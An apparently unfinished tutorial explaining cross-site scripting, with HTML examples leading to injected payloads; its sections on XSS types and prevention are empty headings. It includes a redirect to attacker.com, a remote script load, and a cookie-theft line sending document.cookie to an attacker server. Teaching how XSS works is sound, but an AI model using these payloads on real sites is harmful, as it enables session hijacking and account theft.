An XXS vulnerability occurs when an attacker executes a custom script on the users browser. 
These attacks inject their code onto pages being viewed by other uses and can lead to things like leaking personal information, stealing cookies, changing site content, and or redirect the user to a malicious site. 
## Mechanisms
The attacker injects a script into webpages that users view, in order to understand XSS we first need to understand HTML and Javascript syntax.
Web pages are made up of HTML code that describe the pages structure and contents.

```html
<html>
	<h1>Welcome to my web page.</h1>
	<p>Thanks for visiting!</p>
</html>
```

HTML also allows us to embed images within pages, create user-input forms, link to external pages, and perform various other tasks.
It also allows us to execute scripts inside of HTML documents, its used to control client side application logic to create an interactive experience. 

```html
<html>
	<script>alert("Hello!");</script>
	<h1>Welcome to my web page.</h1>
	<p>Thanks for visiting!</p>
</html>
```

This script creates a pop-up message on the webpage that says `Hello!`.
This is called an `inline script` and are the cause for many XSS vulnerabilities. 

```html
<html>
	<script>alert("Hello!");</script>
	<h1>Welcome to my site.</h1>
	<h3>This is a cybersecurity newsletter that focuses on bug bounty news and write-ups. Please subscribe to my newsletter below to receive new cybersecurity articles in your email inbox.</h3>
	<form action"/subscribe" method="POST">
		<label for="email">Email:</label><br>
		<input type="text" id="email" value="Please enter your email.">
		<br><br>
		<input type="submit" value="Submit">
	</form>
</html>
```

This page contains a form that lets users subscribe to a newsletter.
After a users inputs their email the website confirms it by displaying it on the screen: 
```html
<p>Thanks! You have subscribed <b>example@gmail.com</b> to newsletter.</p>
```

What if the user decides to input a script instead of an email address? 

```html
<script>location="http://attacker.com";</script>
```

If the web application doesn't validate or sanitize the input before displaying the confirmation message the source code for the page would change.

```html
<p>Thanks! You have subscribed <b><script>location="http://attacker.com";</script></b> to newsletter.</p>
```

Validating user input means that the web app checks that the user input meets a certain standard. 
It should change special characters in the input that could be used as a means to interfere with our HTML logic. 
The example were seeing now would cause the user to be redirected to a malicious site.
XSS happens when attackers inject scripts in this way onto a page that another user is visiting. 

```html
<script src=http://attacker.com/xss.js></script>
```

Attackers can also manipulate the `src` attribute in HTML to load javascript files from external sources to execute in the users browser.
This example isn't really possible since there is no way to inject a script but they can redirect themselves to a malicious page. 

```html
http://subscribe.example.com?email=<script>location="http://attacker.com";</script>
```

However lets say the site also allows users to subscribe to the newsletter by visiting a URL, after they visit they will be subscribed, the confirmation will be shown on the users browser.
Attackers can inject a script that included in the link, the browser will think that the script is part of the actual website. 
The script could access resources stored on the browser like cookies and session tokens resulting in your information being stolen and possibly losing access to user accounts. 

```html
<script>image = new Image();
image.src='http://attacker_server_ip/?c='+document.cookie;</script>
```

This example of an XSS attack sends a request to the attack with the victims cookie as a URL parameter. 

## Types of XSS
#### Stored XSS
#### Blind XSS
#### Reflected XSS
#### DOM Based XSS
#### Self XSS
## Prevention
